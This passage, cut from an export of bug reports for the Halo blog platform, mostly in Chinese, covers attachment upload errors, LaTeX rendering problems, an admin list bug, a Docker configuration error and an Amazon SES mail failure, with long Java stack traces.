sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_222]         at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_222]         at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]             at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:888) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]           at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]                at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) [spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at javax.servlet.http.HttpServlet.service(HttpServlet.java:523) [jakarta.servlet-api-4.0.3.jar!/:4.0.3]         at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) [jakarta.servlet-api-4.0.3.jar!/:4.0.3]         at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:89) [classes!/:1.2.0]         at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:167) [classes!/:1.2.0]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:41) [classes!/:1.2.0]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) [spring-boot-actuator-2.2.1.RELEASE.jar!/:2.2.1.RELEASE]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE]         at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]            at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final]         at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_222]         at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_222]         at java.lang.Thread.run(Thread.java:819) [na:1.8.0_222]  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  上传附件  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt; 已经配置了SM.MS图床的Secret Token, 但是上传附件会出现如图错误 ![image](https://user-images.githubusercontent.com/7344772/75898002-73308b80-5e74-11ea-9355-0a995af1bde6.png) </body>
		<created>2020-03-04 16:04:14</created>
		<closed>2020-03-05 06:15:23</closed>
	</bug>
	<bug>
		<id>607</id>
		<title>Latex 公式异常</title>
		<body>我看到之前有一个 issue 反馈过类似问题，我这里完整详细的反馈下，帮助开发人员一步到位解决 Latex 异常问题。  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境 Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production UA 信息：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36 **均已经开启 Mathjax 插件** &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 问题1 Halo 后台会对 latex 公式进行转义，**导致前台无法正常显示，不过编辑后台是能够正常显示的**。 附上问题公式 ``` $$ S=\frac{1}{1-a+\frac{a}{n}} $$ ``` ![image](https://user-images.githubusercontent.com/18729228/75619121-9fb58080-5bb2-11ea-8a7d-bc04864a417a.png)  **后台编辑页面正常显示** ![image](https://user-images.githubusercontent.com/18729228/75619192-911b9900-5bb3-11ea-9928-58e8d6dc4815.png)  **但是前台页面显示异常** ![image](https://user-images.githubusercontent.com/18729228/75619196-a7c1f000-5bb3-11ea-9bbe-598646146010.png)   ## 问题2 后台编辑器对有些 latex 公式显示也异常 附上问题公式，该公式我发表到掘金，简书上是正常的。本地的 Typora 也是正常显示的。 **这一块问题感觉是后台 markdown 编辑器对数学公式标准支持不同**，不知道后台编辑器的数学公式标准是什么。 ``` $$ S=\frac{T}{T'}\\ T=t_n+t\\ T'=t_n+t'\\ f' = \frac{t}{T}=\frac{t}{t_n+t}\\ s'=\frac{t}{t'}\\ \frac{f'}{s'}=\frac{t}{t_n+t} \div \frac{t}{t'}=\frac{t'}{t_n+t}\\ $$ ``` ![image](https://user-images.githubusercontent.com/18729228/75619165-3a15c400-5bb3-11ea-98bf-61108e236690.png)  ## 说明 附上我的问题页面：https://www.inlighting.org/archives/amdahls-law-and-its-proof 。 希望大佬能尽快解决下这类问题，不然像机器学习这块数学公式基本就没法正常显示了。 </body>
		<created>2020-03-01 04:07:56</created>
		<closed>2020-07-21 13:52:32</closed>
	</bug>
	<bug>
		<id>604</id>
		<title>Latex公式被吞掉{}</title>
		<body>当我按照说明添加了以下代码在`head`中之后，行内公式可以正常显示，但是`$$ *** $$`包裹的公式会被吃掉`{}`例如我有一条公式是`$$ E = \sum_{i=0}^{n} $$`文章发布之后Latex公式无法显示并且出现了`$$E = \sum_^n$$`这样的情况，我将下面代码本地运行该公式时可以正常显示！这是否意味着某个环节处理掉了`{}`？但`mathjax`这个库我本地测试过没有问题的。 ``` &lt;script src="//cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer&gt;&lt;/script&gt;     &lt;script&gt;     document.addEventListener('DOMContentLoaded', function () {         MathJax.Hub.Config({             'HTML-CSS': {                 matchFontHeight: false             },             SVG: {                 matchFontHeight: false             },             CommonHTML: {                 matchFontHeight: false             },             tex2jax: {                 inlineMath: [                     ['$','$'],                     ['\\(','\\)']                 ],                 displayMath: [["$$", "$$"], ["\\[", "\\]"]]             }         });     }); &lt;/script&gt; ```  另外我使用`\{`这样的方式处理所有的`{}`后，公式得以正常现实，即`$$ E= \sum_\{i=0\}^\{n\}$$`</body>
		<created>2020-02-28 08:52:32</created>
		<closed>2020-07-21 13:52:35</closed>
	</bug>
	<bug>
		<id>602</id>
		<title>编辑页面能渲染Latex，但是实际浏览却无法渲染Latex</title>
		<body>RT</body>
		<created>2020-02-27 11:02:19</created>
		<closed>2020-02-28 07:08:47</closed>
	</bug>
	<bug>
		<id>601</id>
		<title>后台所有文章页面，文章列表的批量功能在未筛选的情况下被禁用</title>
		<body>  - [x] 我已经安装了最新版的 Halo   - [x] 我已经搜索了已有的 Issues 列表中有关的信息   - [x] 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - [x] 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq ## 我的环境  Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production UA 信息：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36 ---  ## 错误日志  无，前端bug  ## 期望行为 进入文章管理页面，即可勾选文章列表，无论搜索框中是否筛选，都能进行批量操作   ## 当前行为 进入文章管理页面，无法勾选文章列表，鼠标点击被禁用。但在筛选框中选择文章状态后，又能被勾选，重置选项后又进入无法勾选的状态 ![image](https://user-images.githubusercontent.com/20994069/75422122-d1420800-5976-11ea-9afd-adfa7569d3c2.png) ![image](https://user-images.githubusercontent.com/20994069/75422422-7f4db200-5977-11ea-8665-3b31d4418961.png) </body>
		<created>2020-02-27 07:41:44</created>
		<closed>2020-02-27 07:56:43</closed>
	</bug>
	<bug>
		<id>596</id>
		<title>docker部署halo:1.2.0 报错，No active profile set,</title>
		<body>   - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq  ## 我的环境    docker部署halo:1.2.0  ---  ## 错误日志   ::: Spring-Boot 2.2.1.RELEASE     ::: Halo (version: (v1.2.0)) 2020-02-25 18:09:26.644  INFO 6 --- [           main] run.halo.app.Application                 : Starting Application v1.2.0 on blog-halo-5674cbf54-25jn6 with PID 6 (/halo.jar started by root in /) 2020-02-25 18:09:26.756  INFO 6 --- [           main] run.halo.app.Application                 : No active profile set, falling back to default profiles: default   ---  ## 期望行为    能正常读取到 修改后的 配置，不是用default  ## 当前行为     1.修改配置文件   2.按照官方文档 启动镜像挂载docker run -v /usr/mypath/.halo:/root/.halo   3. 启动报错 No active profile set, falling back to default profiles: default   4. mysql 和 h2数据库都试过，都错 </body>
		<created>2020-02-25 10:19:05</created>
		<closed>2020-02-25 10:58:05</closed>
	</bug>
	<bug>
		<id>580</id>
		<title>Amazon SES 邮件发送不成功 (上游OhMyEmail与SMTP标准不符导致)</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production UA 信息：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;   ``` ... 90 common frames omitted at io.github.biezhi.ome.OhMyEmail.from(OhMyEmail.java:138) ~[oh-my-email-0.0.4.jar!/:na] at javax.mail.internet.InternetAddress.&lt;init&gt;(InternetAddress.java:119) ~[javax.mail-1.6.2.jar!/:1.6.2] at javax.mail.internet.InternetAddress.parse(InternetAddress.java:752) ~[javax.mail-1.6.2.jar!/:1.6.2] at javax.mail.internet.InternetAddress.parse(InternetAddress.java:858) ~[javax.mail-1.6.2.jar!/:1.6.2] Caused by: javax.mail.internet.AddressException: Extra route-addr ... 88 common frames omitted at run.halo.app.service.impl.MailServiceImpl.sendMail(MailServiceImpl.java:48) ~[classes!/:1.2.0] at io.github.biezhi.ome.OhMyEmail.from(OhMyEmail.java:126) ~[oh-my-email-0.0.4.jar!/:na] at io.github.biezhi.ome.OhMyEmail.from(OhMyEmail.java:140) ~[oh-my-email-0.0.4.jar!/:na] Caused by: io.github.biezhi.ome.SendMailException: javax.mail.internet.AddressException: Extra route-addr in string ``Blog &lt;sender@example.com&gt; &lt;USERNAME&gt;'' at position 22 at java.lang.Thread.run(Thread.java:819) [na:1.8.0_222] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_222] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_222] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) [spring-boot-actuator-2.2.1.RELEASE.jar!/:2.2.1.RELEASE] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:41) [classes!/:1.2.0] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:167) [classes!/:1.2.0] at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:89) [classes!/:1.2.0] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) [jakarta.servlet-api-4.0.3.jar!/:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:523) [jakarta.servlet-api-4.0.3.jar!/:4.0.3] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:888) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_222] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_222] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_222] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_222] at run.halo.app.controller.admin.api.MailController$$EnhancerBySpringCGLIB$$5cdd39f.testMail(&lt;generated&gt;) ~[classes!/:1.2.0] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at 